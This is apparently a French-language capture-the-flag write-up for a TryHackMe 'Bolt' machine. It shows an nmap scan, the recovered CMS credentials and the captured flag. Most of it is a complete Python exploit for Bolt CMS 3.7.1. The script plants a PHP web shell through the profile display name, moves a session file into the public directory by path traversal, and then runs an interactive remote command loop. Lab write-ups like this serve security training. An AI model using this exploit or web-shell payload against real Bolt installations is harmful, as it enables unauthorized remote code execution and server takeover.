# Target : 10.130.187.245

# Enumeration des ports et services

```js
nmap -sV -sC 10.130.187.245 -p- --min-rate=1000
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-21 13:55 +0000
Nmap scan report for 10.130.187.245
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  http    (PHP 7.2.32-1)
|_http-title: Bolt | A hero is unleashed
|_http-generator: Bolt

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.34 seconds
```

# ENumeration du port 8000 ()

![[Pasted image 20260821135950.png]]

version : 3.7.1

Cette version est vuln a une RCE ****

**CMS Bolt** detecter sur le port 8000

![[Pasted image 20260821141159.png]]

## Finding

```js
jake:boltadmin123
```

## Login Creds

```js
bolt:boltadmin123
```


```python
#!/usr/bin/python

import requests
import sys
import warnings
import re
import os
from bs4 import BeautifulSoup
from colorama import init 
from termcolor import colored 
  
init() 
#pip install -r requirements.txt
print(colored('''
 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄       ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌      ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀      
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌               
▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄      
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌          ▐░▌       ▐░▌          ▐░ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀

Pre Auth rce with low credintanl
#Zero-way By @r3m0t3nu11 speical thanks to @dracula @Mr_Hex''',"blue"))



if len(sys.argv) != 4:
    print((len(sys.argv)))
    print((colored("[~] Usage : ./bolt.py url username password","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]



request = requests.session()
print((colored("[+] Retrieving CSRF token to submit the login form","green")))
page = request.get(url+"/bolt/login")
html_content = page.text
soup = BeautifulSoup(html_content, 'html.parser')
token = soup.findAll('input')[2].get("value")

login_info = {
    "user_login[username]": username,
    "user_login[password]": password,
    "user_login[login]": "",
     "user_login[_token]": token
   }

login_request = request.post(url+"/bolt/login", login_info)
print((colored("[+] Login token is : {0}","green")).format(token))



aaa = request.get(url+"/bolt/profile")
soup0 = BeautifulSoup(aaa.content, 'html.parser')
token0 = soup0.findAll('input')[6].get("value")
data_profile = { 
	"user_profile[password][first]":"password",
	"user_profile[password][second]":"password",
	"user_profile[email]":"a@a.com",
	"user_profile[displayname]":"<?php system($_GET['test']);?>",
	"user_profile[save]":"",
	"user_profile[_token]":token0

		}
profile = request.post(url+'/bolt/profile',data_profile)




cache_csrf = request.get(url+"/bolt/overview/showcases")

soup1 = BeautifulSoup(cache_csrf.text, 'html.parser')
csrf = soup1.findAll('div')[12].get("data-bolt_csrf_token")


asyncc = request.get(url+"/async/browse/cache/.sessions?multiselect=true")
soup2 = BeautifulSoup(asyncc.text, 'html.parser')
tables = soup2.find_all('span', class_ = 'entry disabled')


print((colored("[+] SESSION INJECTION ","green")))
for all_tables in tables: 
	
	f= open("session.txt","a+")
	f.write(all_tables.text+"\n")
	f.close()
	num_lines = sum(1 for line in open('session.txt'))
	
	renamePostData = {
		"namespace": "root",
		"parent": "/app/cache/.sessions",
		"oldname": all_tables.text,
		"newname": "../../../public/files/test{}.php".format(num_lines),
		"token": csrf
	   }
	rename = request.post(url+"/async/folder/rename", renamePostData)
	



	try:
		url1 = url+'/files/test{}.php?test=ls%20-la'.format(num_lines)

		rev = requests.get(url1).text
		r1 = re.findall('php',rev)
		
		r2 = r1[0]
		if r2 == "php" : 
			fileINJ = "test{}".format(num_lines)
			
			print((colored("[+] FOUND  : "+fileINJ,"green")))
		
	except IndexError:
		print((colored("[-] Not found.","red")))

new_name = 0
while new_name != 'quit':
	inputs = input(colored("Enter OS command , for exit 'quit' : ","green","on_red"))
	if inputs == "quit" :
		exit()
	else:
		a = requests.get(url+"/files/{}.php?test={}".format(fileINJ,inputs))
		aa = a.text
		r11 = re.findall('...displayname";s:..:"([\w\s\W]+)',aa)


		print((r11)[0])
```


```js
 python exploit.py http://bolt.thm:8000 bolt boltadmin123 
```


# Flag : THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}